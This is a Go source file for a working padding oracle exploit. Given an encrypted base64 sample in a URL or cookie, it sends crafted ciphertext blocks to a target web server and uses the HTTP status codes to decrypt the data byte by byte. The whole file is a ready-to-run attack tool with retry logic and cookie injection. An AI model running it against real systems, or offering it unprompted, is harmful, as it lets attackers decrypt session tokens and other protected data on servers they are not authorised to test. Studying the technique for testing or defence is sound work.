package pax

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/avast/retry-go"
	"github.com/viki-org/dnscache"
)

var alphabet []byte

func init() {
	var i byte
	for i = 32; i < 127; i++ {
		alphabet = append(alphabet, i)
	}
	for i = 0; i < 32; i++ {
		alphabet = append(alphabet, i)
	}
	for i = 127; i != 0; i++ {
		alphabet = append(alphabet, i)
	}
}

type ExploitOptions struct {
	BlockSize int
	Method    string
	Cookies   string
}

var defaultOptions = &ExploitOptions{
	BlockSize: 16,
	Method:    http.MethodGet,
}

func (options *ExploitOptions) inherit() {
	if options.Method == "" {
		options.Method = defaultOptions.Method
	}
	if options.BlockSize == 0 {
		options.BlockSize = defaultOptions.BlockSize
	}
}

func Exploit(url string, sample string, options *ExploitOptions) ([]byte, error) {
	return newExploiter(url, sample, options).run()
}

type exploiter struct {
	client    *http.Client
	sample    string
	url       string
	blockSize int
	method    string
	cookies   string
	urlEncode bool
}

func newExploiter(url, sample string, options *ExploitOptions) *exploiter {
	if options == nil {
		options = defaultOptions
	} else {
		options.inherit()
	}

	client := &http.Client{
		Timeout: time.Second * 10,
	}

	resolver := dnscache.New(time.Minute * 5)

	client.Transport = &http.Transport{
		MaxIdleConnsPerHost: 64,
		DialContext: func(ctx context.Context, network string, address string) (net.Conn, error) {
			separator := strings.LastIndex(address, ":")
			ip, err := resolver.FetchOneString(address[:separator])
			if err != nil {
				return nil, err
			}
			return net.Dial("tcp", ip+address[separator:])
		},
	}

	return &exploiter{
		sample:    sample,
		url:       url,
		blockSize: options.BlockSize,
		method:    options.Method,
		cookies:   options.Cookies,
		client:    &http.Client{},
	}
}

func (x *exploiter) run() ([]byte, error) {

	rawB64 := x.sample

	fmt.Println("Decoding sample...")

	if strings.Contains(x.sample, "%") {
		var err error
		rawB64, err = url.QueryUnescape(x.sample)
		if err != nil {
			return nil, err
		}
		x.urlEncode = true
	}

	sample, err := base64.StdEncoding.DecodeString(rawB64)
	if err != nil { // if this isn't valid base64, just take it as literal encrypted bytes
		return nil, err
	}

	fmt.Println("Checking sample...")

	if len(sample)%x.blockSize > 0 {
		return nil, fmt.Errorf("sample data is incorrect length for given blocksize")
	}

	fmt.Println("Trying oracle with sample data...")

	valid, err := x.try(sample)
	if err != nil {
		return nil, err
	}
	if !valid {
		return nil, fmt.Errorf("sample data does not appear to be valid")
	}

	random := make([]byte, x.blockSize)

	blockCount := len(sample) / x.blockSize

	var plaintext []byte

	for blockIndex := 1; blockIndex < blockCount; blockIndex++ {

		fmt.Printf("Working on block %d of %d...\n", blockIndex, blockCount-1)

		intermediate := make([]byte, x.blockSize)
		blockPlaintext := make([]byte, x.blockSize)

		targetBlock := sample[blockIndex*x.blockSize : (blockIndex+1)*x.blockSize]
		crafted := append(random, targetBlock...)

		for byteIndex := x.blockSize - 1; byteIndex >= 0; byteIndex-- {

			// calculate values so that all N bytes after the one we're targeting equal N
			for p := x.blockSize - 1; p > byteIndex; p-- {
				padTarget := byte(x.blockSize - byteIndex)
				/*
						C'1[16] = P'2[16] ^ I2[16]
					        	= 02      ^ 95
					        	= 93
				*/
				crafted[p] = padTarget ^ intermediate[p]
			}

			var found bool
			for i := 0; i <= 0xff; i++ {

				crafted[byteIndex] = byte(i)

				valid, err := x.try(crafted)
				if err != nil {
					return nil, err
				}

				if valid {
					found = true
					break
				}
			}

			if !found {
				crafted[byteIndex] = 0
				return nil, fmt.Errorf("could not find bad padding")
			}

			/*

				C1' = crafted[0:16]
				P2' = ???????????????1
				P2  = ????????????????
				I2  = intermediate

				I2     = C1'     ^ P2'
				I2[16] = C1'[16] ^ P2'[16]
				       = 94      ^ 01
				       = 95

			*/

			intermediate[byteIndex] = crafted[byteIndex] ^ byte(x.blockSize-byteIndex)

			/*
				C1 = sample

				P2[16] = C1[16] ^ I2[16]
				= C1[16] ^ 95
			*/

			blockPlaintext[byteIndex] = sample[((blockIndex-1)*x.blockSize)+byteIndex] ^ intermediate[byteIndex]

		}

		plaintext = append(plaintext, blockPlaintext...)
	}

	fmt.Println("Removing padding from solution...\n")

	return pkcs7Unpad(plaintext, x.blockSize)
}

func clean(data []byte) string {
	var result string
	for _, b := range data {
		if b < 32 || b >= 127 {
			result += " "
		} else {
			result += string([]byte{b})
		}
	}
	return result
}

// returns true if payload is valid
func (x *exploiter) try(payload []byte) (bool, error) {

	encoded := base64.StdEncoding.EncodeToString(payload)

	fullURL := strings.ReplaceAll(x.url, x.sample, encoded)

	req, err := http.NewRequest(x.method, fullURL, nil)
	if err != nil {
		return false, err
	}

	if x.cookies != "" {
		cookies := strings.Split(x.cookies, ";")
		for _, cookie := range cookies {
			parts := strings.SplitN(cookie, "=", 2)
			if len(parts) == 2 {
				escaped := encoded
				if x.urlEncode {
					escaped = url.QueryEscape(escaped)
				}
				req.AddCookie(&http.Cookie{
					Name:   strings.TrimSpace(parts[0]),
					Value:  strings.ReplaceAll(strings.TrimSpace(parts[1]), x.sample, escaped),
					Path:   "/",
					Domain: req.Host,
				})
			}
		}
	}

	var statusCode int

	if err := retry.Do(func() error {
		response, err := x.client.Do(req)
		if err != nil {
			return fmt.Errorf("request to oracle failed with error: %s", err)
		}
		defer func() {
			io.Copy(ioutil.Discard, response.Body)
			response.Body.Close()
		}()
		if response.StatusCode == http.StatusBadGateway ||
			response.StatusCode == http.StatusGatewayTimeout ||
			response.StatusCode == http.StatusServiceUnavailable {
			return fmt.Errorf("request to oracle failed with HTTP status %d", response.StatusCode)
		}
		statusCode = response.StatusCode
		return nil
	}, retry.Attempts(5)); err != nil {
		return false, err
	}

	if statusCode > 399 {
		return false, nil
	}

	return true, nil
}
